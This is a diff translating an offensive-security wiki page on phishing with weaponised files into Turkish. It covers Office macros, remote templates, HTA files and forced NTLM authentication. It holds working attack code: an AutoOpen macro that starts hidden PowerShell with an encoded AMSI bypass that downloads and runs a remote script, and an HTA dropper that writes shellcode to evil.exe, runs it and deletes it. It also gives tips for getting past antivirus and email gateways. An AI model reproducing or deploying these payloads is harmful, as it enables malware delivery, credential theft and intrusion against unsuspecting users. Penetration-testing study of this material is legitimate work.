@@ -1,55 +1,52 @@
-# Phishing Files & Documents
+# Phishing Dosyaları ve Belgeleri
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Documents
+## Ofis Belgeleri
 
-Microsoft Word performs file data validation before opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened.
+Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapısı tanımlaması şeklinde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmayacaktır.
 
-Usually, Word files containing macros use the `.docm` extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
-For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.\
-The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).
+Genellikle, makrolar içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyanın adını değiştirmek ve makro çalıştırma yeteneklerini korumak mümkündür.\
+Örneğin, bir RTF dosyası tasarımı gereği makroları desteklemez, ancak RTF olarak yeniden adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenecek ve makro çalıştırma yeteneğine sahip olacaktır.\
+Aynı iç yapılar ve mekanizmalar Microsoft Office Suite'in (Excel, PowerPoint vb.) tüm yazılımlarına uygulanır.
 
-You can use the following command to check which extensions are going to be executed by some Office programs:
-
+Aşağıdaki komutu kullanarak bazı Ofis programları tarafından hangi uzantıların çalıştırılacağını kontrol edebilirsiniz:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
+DOCX dosyaları, makroları içeren uzak bir şablona atıfta bulunuyorsa (Dosya – Seçenekler – Eklentiler – Yönet: Şablonlar – Git) makroları “çalıştırabilir”.
 
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+### Harici Görüntü Yükleme
 
-### External Image Load
-
-Go to: _Insert --> Quick Parts --> Field_\
-&#xNAN;_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+Git: _Ekle --> Hızlı Parçalar --> Alan_\
+&#xNAN;_**Kategoriler**: Bağlantılar ve Referanslar, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://\<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
-### Macros Backdoor
+### Makrolar Arka Kapı
 
-It's possible to use macros to run arbitrary code from the document.
+Makroları, belgeden rastgele kod çalıştırmak için kullanmak mümkündür.
 
-#### Autoload functions
+#### Otomatik Yükleme Fonksiyonları
 
-The more common they are, the more probable the AV will detect them.
+Ne kadar yaygın olurlarsa, antivirüsün bunları tespit etme olasılığı o kadar artar.
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Code Examples
-
+#### Makrolar Kod Örnekleri
 ```vba
 Sub AutoOpen()
-    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
+CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
 End Sub
 ```
 
 ```vba
 Sub AutoOpen()
 
-  Dim Shell As Object
-  Set Shell = CreateObject("wscript.shell")
-  Shell.Run "calc"
+Dim Shell As Object
+Set Shell = CreateObject("wscript.shell")
+Shell.Run "calc"
 
 End Sub
 ```
@@ -58,8 +55,8 @@ End Sub
 Dim author As String
 author = oWB.BuiltinDocumentProperties("Author")
 With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
- .StdIn.WriteLine author
- .StdIn.WriteBlackLines 1
+.StdIn.WriteLine author
+.StdIn.WriteBlackLines 1
 ```
 
 ```vba
@@ -67,88 +64,85 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
+#### Manuel olarak meta verileri kaldırma
 
-#### Manually remove metadata
+**Dosya > Bilgi > Belgeyi Denetle > Belgeyi Denetle** yolunu izleyin, bu Belge Denetleyicisini açacaktır. **Denetle** butonuna tıklayın ve ardından **Belge Özellikleri ve Kişisel Bilgileri Kaldır** kısmının yanındaki **Tümünü Kaldır** butonuna tıklayın.
 
-Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.
+#### Doc Uzantısı
 
-#### Doc Extension
+İşlem tamamlandığında, **Farklı Kaydet** türü açılır menüsünden, formatı **`.docx`**'den **Word 97-2003 `.doc`**'ye değiştirin.\
+Bunu yapın çünkü **`.docx`** içinde makroları kaydedemezsiniz ve makro etkin **`.docm`** uzantısı etrafında bir **stigma** vardır (örneğin, küçük resim simgesi büyük bir `!` içerir ve bazı web/e-posta geçitleri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.
 
-When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
-Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.
-
-#### Malicious Macros Generators
+#### Kötü Amaçlı Makro Üreticileri
 
 - MacOS
-  - [**macphish**](https://github.com/cldrn/macphish)
-  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
+- [**macphish**](https://github.com/cldrn/macphish)
+- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Files
+## HTA Dosyaları
 
-An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.
+HTA, **HTML ve betik dilleri (VBScript ve JScript gibi)** birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir "tamamen güvenilir" uygulama olarak çalışır, bir tarayıcının güvenlik modelinin kısıtlamaları olmadan.
 
-An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
-
+HTA, genellikle **Internet Explorer** ile birlikte **kurulan** **`mshta.exe`** kullanılarak çalıştırılır, bu da **`mshta`'nın IE'ye bağımlı** olduğu anlamına gelir. Eğer kaldırılmışsa, HTA'lar çalıştırılamayacaktır.
 ```html
 <--! Basic HTA Execution -->
 <html>
-  <head>
-    <title>Hello World</title>
-  </head>
-  <body>
-    <h2>Hello World</h2>
-    <p>This is an HTA...</p>
-  </body>
+<head>
+<title>Hello World</title>
+</head>
+<body>
+<h2>Hello World</h2>
+<p>This is an HTA...</p>
+</body>
 
-  <script language="VBScript">
-    Function Pwn()
-      Set shell = CreateObject("wscript.Shell")
-      shell.run "calc"
-    End Function
+<script language="VBScript">
+Function Pwn()
+Set shell = CreateObject("wscript.Shell")
+shell.run "calc"
+End Function
 
-    Pwn
-  </script>
+Pwn
+</script>
 </html>
 ```
 
 ```html
 <--! Cobal Strike generated HTA without shellcode -->
 <script language="VBScript">
-  Function var_func()
-  	var_shellcode = "<shellcode>"
+Function var_func()
+var_shellcode = "<shellcode>"
 
-  	Dim var_obj
-  	Set var_obj = CreateObject("Scripting.FileSystemObject")
-  	Dim var_stream
-  	Dim var_tempdir
-  	Dim var_tempexe
-  	Dim var_basedir
-  	Set var_tempdir = var_obj.GetSpecialFolder(2)
-  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
-  	var_obj.CreateFolder(var_basedir)
-  	var_tempexe = var_basedir & "\" & "evil.exe"
-  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
-  	For i = 1 to Len(var_shellcode) Step 2
-  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
-  	Next
-  	var_stream.Close
-  	Dim var_shell
-  	Set var_shell = CreateObject("Wscript.Shell")
-  	var_shell.run var_tempexe, 0, true
-  	var_obj.DeleteFile(var_tempexe)
-  	var_obj.DeleteFolder(var_basedir)
-  End Function
+Dim var_obj
+Set var_obj = CreateObject("Scripting.FileSystemObject")
+Dim var_stream
+Dim var_tempdir
+Dim var_tempexe
+Dim var_basedir
+Set var_tempdir = var_obj.GetSpecialFolder(2)
+var_basedir = var_tempdir & "\" & var_obj.GetTempName()
+var_obj.CreateFolder(var_basedir)
+var_tempexe = var_basedir & "\" & "evil.exe"
+Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
+For i = 1 to Len(var_shellcode) Step 2
+var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
+Next
+var_stream.Close
+Dim var_shell
+Set var_shell = CreateObject("Wscript.Shell")
+var_shell.run var_tempexe, 0, true
+var_obj.DeleteFile(var_tempexe)
+var_obj.DeleteFolder(var_basedir)
+End Function
 
-  var_func
-  self.close
+var_func
+self.close
 </script>
 ```
+## NTLM Kimlik Doğrulamasını Zorlamak
 
-## Forcing NTLM Authentication
+Kullanıcıların erişeceği e-postalara veya HTML'ye **görünmez resimler** ekleyerek (hatta HTTP MitM?) gibi çeşitli yollarla **uzaktan NTLM kimlik doğrulamasını zorlamak** mümkündür. Ya da kurbanı, **klasörü açmak için** sadece **kimlik doğrulamasını tetikleyecek dosyaların adresiyle** gönderebilirsiniz.
 
-There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**
-
-**Check these ideas and more in the following pages:**
+**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda kontrol edin:**
 
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
@@ -158,11 +152,11 @@ There are several ways to **force NTLM authentication "remotely"**, for example,
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
-### NTLM Relay
+### NTLM İletimi
 
-Don't forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
+Sadece hash veya kimlik doğrulamasını çalamayacağınızı, aynı zamanda **NTLM iletim saldırıları gerçekleştirebileceğinizi** unutmayın:
 
-- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+- [**NTLM İletim saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+- [**AD CS ESC8 (NTLM iletimi ile sertifikalar)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 {{#include ../../banners/hacktricks-training.md}}
